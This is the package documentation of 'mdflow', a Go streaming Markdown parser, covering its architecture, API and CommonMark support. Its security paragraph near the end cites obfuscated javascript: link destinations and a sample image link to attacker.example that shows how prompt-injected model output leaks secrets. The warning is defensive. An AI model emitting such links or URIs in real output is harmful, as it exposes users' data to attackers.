// Package mdflow is a streaming Markdown parser with a chainable,
// functional API.
//
// # Layers
//
// mdflow itself is a facade. It owns no syntax and no markup — it wires the
// layers below together and adds the chaining and functional surface:
//
//	token           node kinds, inline tokens, leaves, block events; no dependencies
//	parser          the state machines, the rules, and the extension seam
//	renderer        the Renderer interface and its optional capabilities
//	renderer/html   the HTML implementation
//	extension       the capability seam: syntax paired with the output it produces
//	extension/*      each capability in its own module (table, math, ...)
//	mdflow          facade: composition, chaining, streaming, fan-out
//
// Dependencies point strictly downward, and none of them is a type assertion in
// disguise: an extension configures output through the capability interfaces in
// package renderer, never by reaching for the concrete HTML renderer. A new
// output format is a new Renderer; new syntax is a new capability. Neither
// touches the other. The parser and token layers do not depend on public
// extensions; the mdflow facade deliberately composes the internal raw-HTML
// capability into its default CommonMark profile.
//
// Use [New] for complete CommonMark 0.31.2, [NewBuilder] to add capabilities,
// or the umbrella `all` module for CommonMark plus every bundled GFM and Memos
// extension:
//
//	import "github.com/Wenrh2004/mdflow/all"
//	html := all.New().HTML(src)
//
// # Three ideas
//
// No syntax tree. Parsing emits a flat stream of Enter/Leave/Text/Code events
// (the pulldown-cmark model). Nothing allocates a node per construct, nothing
// walks a tree twice, and a consumer can stop halfway through a document. That
// is why the vocabulary package is called token and not ast.
//
// Line-driven and incremental. The block state machine never revisits a closed
// block. An unresolved reference pauses only its resumable inline cursor and
// the suffix behind it until a later definition arrives or end of input seals
// the definition map; it does not cause a document prepass or reparse. That is
// what keeps [Parser.Stream] O(n), where re-parsing on every chunk — the usual
// approach in a chat UI — is O(n²).
//
// Rules, not switches. Block and inline syntax live in registries — container,
// leaf and inline rules in package parser — and output lives behind a Renderer,
// so new syntax and new output formats are additions rather than forks.
// Flavour syntax past CommonMark (GFM tables and task lists, math, hashtags,
// typography, wiki resources) is registered through that seam, on the same
// footing as syntax you add yourself: the core vocabulary names none of it.
// CommonMark raw HTML uses the same architecture and is composed safely by the
// facade rather than built into package parser.
//
// # Basic use
//
//	html := mdflow.HTML("# Hello\n\nSome *markdown*.\n")
//
// For repeated parsing, build a [Parser] once and share it. It is immutable and
// safe for concurrent use; its scratch state is pooled.
//
//	var md = mdflow.New()
//
//	func handler(w http.ResponseWriter, r *http.Request) {
//		md.Render(w, source) // streams; no document-sized string
//	}
//
// # Chaining
//
// Every chaining method returns a new Parser, so derived parsers never disturb
// the one they came from:
//
//	docs := mdflow.New().
//		Transform(mdflow.ShiftHeadings(1)).
//		Transform(mdflow.RewriteLinks(absolutize)).
//		Transform(mdflow.Drop(mdflow.IsImage))
//
//	html := docs.HTML(src)
//
// A Parser with no middleware installed takes a fast path that bypasses the
// event stream entirely, so the functional layer costs nothing when unused.
//
// # Functional style
//
// The event stream is an [iter.Seq], so it composes with ordinary Go. The
// generic combinators (iterx.Map, iterx.Filter, iterx.Reduce,
// iterx.Take, ...) live in package [github.com/Wenrh2004/mdflow/iterx] as free
// functions, because Go does not permit type parameters on methods.
//
//	words := iterx.Reduce(mdflow.Events(src), 0, func(n int, e mdflow.Event) int {
//		if e.Type == mdflow.TextEvent {
//			return n + len(strings.Fields(e.Text))
//		}
//		return n
//	})
//
// Extension syntax is matched by tag rather than by node kind, since the core
// vocabulary does not enumerate it. Each extension module exports its own
// predicate — table.IsTable, math.IsMath — while [Tagged] and [TaggedLeaf] build
// one for any tag, including one your own capability defines.
//
// # Parallelism
//
// Block structure is inherently sequential. Once that phase is complete and
// reference definitions are sealed, inline parsing uses one immutable resolver
// and can distribute across closed leaves. [Parser.Workers] fans it across
// cores. Since the inline scanner got faster that phase is a small share of the
// work, so the gain is modest (about 1.1x on large documents) and it can lose
// on a loaded machine; measure before enabling it. It is opt-in, and falls back
// to sequential below 16 KiB or when a middleware chain is installed. See
// [Parser.Workers] for the measured trade-off.
//
// # Supported syntax
//
// [New] implements complete CommonMark 0.31.2, including indented and fenced
// code, reference links and images, entities and tabs, lazy continuation,
// tight/loose lists, and raw HTML blocks and inlines. The official trusted-input
// conformance suite is pinned at 652/652 examples. Raw HTML is supplied through
// an extension capability and escaped by default; trusted documents can opt
// into verbatim output explicitly:
//
//	import "github.com/Wenrh2004/mdflow/extension/rawhtml"
//	trusted := mdflow.New(rawhtml.WithUnsafeHTML())
//
// The safe default covers raw HTML only. Link and image URI schemes are not
// filtered by default — javascript:, data: and vbscript: destinations pass
// through as written, and because destinations are entity-decoded before output
// an obfuscated java&#115;cript: reaches the renderer as javascript: too. Pass
// [WithSafeLinks] to filter destinations to an http/https/mailto/tel/relative
// allowlist when rendering untrusted input, and [WithURLPolicy] with
// html.AllowImageHosts to stop model output from loading remote images — the
// channel a prompt-injected ![](https://attacker.example/?q=secret) leaks
// data through.
//
// Output is linear in input on every profile: reference expansion and GFM
// table padding are budgeted, as in cmark and cmark-gfm.
//
// GFM tables, strikethrough and task lists, and the Memos math, hashtag,
// typography and wiki-resource syntax live under extension/. Task lists are
// entirely GFM syntax rather than a core node kind. Package `all` bundles those
// flavours on top of the complete CommonMark profile.
package mdflow
